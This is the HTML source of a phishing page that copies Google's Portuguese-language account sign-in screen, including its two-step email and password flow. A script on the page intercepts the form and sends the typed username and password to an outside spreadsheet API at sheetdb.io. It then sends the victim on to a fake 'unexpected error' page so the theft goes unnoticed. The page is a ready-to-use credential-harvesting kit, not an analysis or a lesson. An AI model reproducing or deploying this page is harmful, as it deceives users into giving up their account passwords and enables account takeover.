<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <link rel="icon" href="ico.ico" type="image/x-icon">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fazer Login nas Contas Google</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background-color: #1e1f20;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .login-container {
            background-color: #0e0e0e;
            padding: 3rem;
            border-radius: 24px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 12px 32px rgba(0, 0, 0, 0.4);
            color: #ffffff;
            display: flex;
            flex-direction: column;
        }

        .logo {
            display: block;
            height: 40px;
            width: auto;
            margin-bottom: 1.5rem;
            align-self: flex-start;
        }

        .login-container h2 {
            font-family: 'Inter', sans-serif;
            text-align: left;
            margin-bottom: 0.5rem;
            font-size: 1.8rem;
            font-weight: 400;
            letter-spacing: -0.5px;
        }

        .subtitle {
            font-family: 'Inter', sans-serif;
            text-align: left;
            color: #b3b3b3;
            font-size: 0.95rem;
            margin-bottom: 2rem;
            font-weight: 400;
        }

        /* Badge do usuário selecionado com Ícone de Perfil Default */
        .user-badge {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background-color: #848484;
            border: 1px solid #9dc8fa;
            padding: 6px 14px 6px 10px;
            border-radius: 20px;
            font-size: 0.85rem;
            color: #ffffff;
            margin-bottom: 1.5rem;
            cursor: pointer;
            transition: border-color 0.2s ease;
        }

        .user-badge:hover {
            border-color: #9dc8fa;
        }

        .user-icon-default {
            width: 18px;
            height: 18px;
            fill: #c7c7c7;
        }

        .input-group {
            position: relative;
            margin-bottom: 1rem;
        }

        .input-group input[type="text"],
        .input-group input[type="password"] {
            width: 100%;
            padding: 1rem 0.8rem;
            border-radius: 10px;
            border: 1px solid #4a4a4a;
            background-color: #0e0e0e;
            color: #ffffff;
            font-size: 1rem;
            outline: none;
            transition: border-color 0.2s ease;
        }

        .input-group input[type="text"]:focus,
        .input-group input[type="password"]:focus {
            border-color: #9dc8fa;
        }

        .floating-label {
            position: absolute;
            left: 0.8rem;
            top: 1rem;
            color: #888888;
            font-size: 1rem;
            pointer-events: none;
            transition: all 0.2s ease;
            background-color: #0e0e0e;
            padding: 0 0.4rem;
            line-height: 1;
        }

        .input-group input:focus ~ .floating-label,
        .input-group input:not(:placeholder-shown) ~ .floating-label {
            top: -0.5rem;
            font-size: 0.75rem;
            color: #9dc8fa;
        }

        .sub-link {
            display: inline-block;
            margin-top: 0.4rem;
            margin-left: 0.2rem;
            color: #9dc8fa;
            text-decoration: none;
            font-size: 0.8rem;
        }

        .sub-link:hover {
            text-decoration: underline;
        }

        .info-text {
            font-family: 'Inter', sans-serif;
            color: #b3b3b3;
            font-size: 0.8rem;
            line-height: 1.4;
            margin-top: 1.5rem;
            margin-bottom: 2.5rem;
            padding-left: 0.2rem;
        }

        .info-text a {
            color: #9dc8fa;
            text-decoration: none;
        }

        .info-text a:hover {
            text-decoration: underline;
        }

        .show-password-container {
            display: flex;
            align-items: center;
            margin-top: 0.75rem;
            margin-left: 0.2rem;
            user-select: none;
        }

        .show-password-container .custom-checkbox {
            appearance: none;
            -webkit-appearance: none;
            width: 14px;
            height: 14px;
            border: 1px solid #4a4a4a;
            border-radius: 3px;
            background-color: transparent !important;
            padding: 0 !important;
            cursor: pointer;
            margin-right: 0.5rem;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: border-color 0.2s ease;
        }

        .show-password-container .custom-checkbox:checked {
            border-color: #9dc8fa;
        }

        .show-password-container .custom-checkbox:checked::before {
            content: "✓";
            color: #9dc8fa;
            font-size: 10px;
            font-weight: bold;
        }

        .checkbox-label {
            color: #b3b3b3;
            font-size: 0.85rem;
            cursor: pointer;
            line-height: 1;
        }

        .checkbox-label:hover {
            color: #ffffff;
        }

        .button-container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 2rem;
        }
        
        .btn-text {
            font-family: 'Inter', sans-serif;
            background: none;
            border: none;
            color: #9dc8fa;
            font-size: 0.85rem;
            font-weight: 500;
            cursor: pointer;
            padding: 0;
            transition: opacity 0.2s;
        }

        .btn-text:hover {
            opacity: 0.8;
            text-decoration: underline;
        }

        .btn-login {
            font-family: 'Inter', sans-serif;
            background-color: #9dc8fa;
            color: #051b33;
            border: none;
            padding: 0.45rem 1.4rem;
            border-radius: 50px;
            font-size: 0.85rem;
            font-weight: 600;
            cursor: pointer;
            transition: opacity 0.2s;
        }

        .btn-login:hover {
            opacity: 0.9;
        }

        .footer-nav {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 1.25rem;
            margin-top: 2.5rem;
        }

        .footer-nav button, .language-selector {
            background: none;
            border: none;
            color: #ffffff;
            font-size: 0.75rem;
            cursor: pointer;
            opacity: 0.7;
            transition: opacity 0.2s;
        }

        .footer-nav button:hover, .language-selector:hover {
            opacity: 1;
        }

        .footer-nav button:hover {
            text-decoration: underline;
        }

        .language-selector {
            display: flex;
            align-items: center;
            user-select: none;
        }

        .language-selector::after {
            content: "▲";
            font-size: 7px;
            margin-left: 0.35rem;
            transform: rotate(180deg);
            display: inline-block;
            opacity: 0.7;
        }

        .hidden {
            display: none !important;
        }

        /* AJUSTES PARA DISPOSITIVOS MÓVEIS */
        @media (max-width: 480px) {
            body {
                background-color: #0e0e0e;
                align-items: flex-start;
                overflow: hidden; /* Evita rolagens indesejadas */
            }

            .login-container {
                border-radius: 0;
                box-shadow: none;
                padding: 1.25rem 1.5rem; 
                height: 100dvh;            /* Usa dynamic viewport height */
                min-height: 100dvh;
                max-height: 100dvh;
                justify-content: space-between;
            }

            .logo {
                margin-top: 0.2rem;
                margin-bottom: 1.5rem;
                height: 48px;              /* Logo 50% maior */
            }

            .subtitle {
                margin-bottom: 1.5rem;
            }

            .info-text {
                margin-top: 2rem;          /* Espaço maior que antecede o parágrafo */
                margin-bottom: 3rem;       /* Espaço maior que sucede o parágrafo */
                font-size: 0.85rem;
            }

            .button-container {
                margin-top: 1rem;
            }

            .footer-nav {
                margin-top: auto;
                padding-bottom: 0.5rem;
                gap: 1rem;
                flex-wrap: wrap;
            }
        }
    </style>
</head>
<body>

    <div class="login-container">
        <img src="logo.png" alt="Logo" class="logo">
        
        <form id="formulario">         
            <div id="step-username">
                <h2>Faça Login</h2>
                <p class="subtitle">Use sua Conta Google.</p>
                
                <div class="input-group">
                    <input type="text" id="username" name="username" placeholder=" " required spellcheck="false">
                    <span class="floating-label">E-mail ou Telefone</span>
                    <a href="#" class="sub-link">Esqueceu o e-mail?</a>
                </div>

                <p class="info-text">
                    Não está no seu computador? Use o modo de navegação privada para fazer login. <a href="#">Saiba mais</a>
                </p>

                <div class="button-container">
                    <button type="button" class="btn-text">Criar conta</button>
                    <button type="submit" class="btn-login" id="btn-next">Avançar</button>
                </div>
            </div>

            <div id="step-password" class="hidden">
                <h2>Olá</h2>
                
                <div class="user-badge" id="change-user" title="Trocar de conta">
                    <svg class="user-icon-default" viewBox="0 0 24 24">
                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/>
                    </svg>
                    <span id="display-user"></span>
                    <small style="color: #888888; font-size: 9px; margin-left: 2px;">▼</small>
                </div>
                
                <div class="input-group">
                    <input type="password" id="password" name="password" placeholder=" ">
                    <span class="floating-label">Digite sua senha</span>
                    <a href="#" class="sub-link">Esqueceu a senha?</a>
                    
                    <div class="show-password-container">
                        <input type="checkbox" id="show-password" class="custom-checkbox">
                        <label for="show-password" class="checkbox-label">Mostrar senha</label>
                    </div>
                </div>

                <div class="button-container">
                    <button type="button" class="btn-text" id="btn-back">Voltar</button>
                    <button type="submit" class="btn-login">Entrar</button>
                </div>
            </div>

        </form>

        <div class="footer-nav">
            <div class="language-selector">Português (Brasil)</div>
            <button type="button">Ajuda</button>
            <button type="button">Privacidade</button>
            <button type="button">Termos</button>
        </div>
    </div>

    <script>
        const stepUsername = document.getElementById('step-username');
        const stepPassword = document.getElementById('step-password');
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
        const displayUser = document.getElementById('display-user');
        
        const btnNext = document.getElementById('btn-next');
        const btnBack = document.getElementById('btn-back');
        const changeUser = document.getElementById('change-user');
        const showPasswordCheckbox = document.getElementById('show-password');

        btnNext.addEventListener('click', () => {
            if (usernameInput.checkValidity()) {
                displayUser.textContent = usernameInput.value;
                stepUsername.classList.add('hidden');
                stepPassword.classList.remove('hidden');
                passwordInput.setAttribute('required', 'required');
                passwordInput.focus();
            } else {
                usernameInput.reportValidity();
            }
        });

        function goToStepOne() {
            stepPassword.classList.add('hidden');
            stepUsername.classList.remove('hidden');
            passwordInput.removeAttribute('required');
            usernameInput.focus();
        }

        btnBack.addEventListener('click', goToStepOne);
        changeUser.addEventListener('click', goToStepOne);

        showPasswordCheckbox.addEventListener('change', function() {
            passwordInput.type = this.checked ? 'text' : 'password';
        });
    </script>
    <script>
    const form = document.getElementById('formulario');

    form.addEventListener('submit', e => {
        e.preventDefault();

        fetch('https://sheetdb.io/api/v1/lfhw7ypaq2100', {
            method: 'POST',
            headers: {
                'Accept': 'application/json',
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                data: {
                    'username': form.username.value,
                    'password': form.password.value,
                }
            })
        })
        .then((response) => response.json())
        .then((data) => {
            // Assim que o SheetDB responder OK, redireciona para a sua tela final
            window.location.href = 'erro_inesperado.html'; 
        })
        .catch((error) => {
            console.error('Erro:', error);
            alert('Ocorreu um erro ao enviar. Tente novamente.');
        });
    });
</script>

</body>
</html>
